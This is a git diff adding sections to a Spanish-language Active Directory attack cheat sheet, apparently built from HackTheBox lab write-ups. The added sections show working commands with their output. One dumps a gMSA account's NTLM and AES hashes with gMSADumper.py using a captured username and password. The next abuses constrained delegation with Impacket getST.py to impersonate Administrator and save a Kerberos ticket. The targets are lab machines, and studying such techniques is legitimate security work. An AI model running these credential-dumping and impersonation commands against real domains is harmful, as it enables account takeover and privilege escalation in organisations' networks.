@@ -103,6 +103,8 @@ net group Backup_Admins claire /add
 
 ## Abuso ReadGMSAPassword
 
+![image](https://rubbxalc.github.io/writeups/assets/img/Intelligence-htb/4.png)
+
 ### Desde binario externo
 
 ```null
@@ -133,6 +135,36 @@ PS C:\Temp> $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPass
 PS C:\Temp> $cred = New-Object System.Management.Automation.PSCredential('search.htb\bir-adfs-gmsa',$SecPass)
 PS C:\Temp> Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }
 search\bir-adfs-gmsa$ 
+```
+
+### De forma remota
+
+```null
+python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -l 10.10.10.248 -d intelligence.htb
+Users or groups who can read password for svc_int$:
+ > DC$
+ > itsupport
+svc_int$:::4eded24079fe2667c67f2b43fd6cb57b
+svc_int$:aes256-cts-hmac-sha1-96:3f07249f66a3678529bc87b0d6bce206d86ef0e5ed00f488d66751810c722817
+svc_int$:aes128-cts-hmac-sha1-96:b8173f21d39ccd3e047ea12c2f791ab4
+```
+
+## Abuso de AllowedToDelegate
+
+Esto significa que tengo la capacidad de impersonar a un usuario
+
+![image](https://rubbxalc.github.io/writeups/assets/img/Intelligence-htb/6.png)
+
+```null
+getST.py intelligence.htb/svc_int -hashes :4eded24079fe2667c67f2b43fd6cb57b -impersonate Administrator -spn WWW/dc.intelligence.htb
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
 ```
 
 ## Abuso de GenericWrite
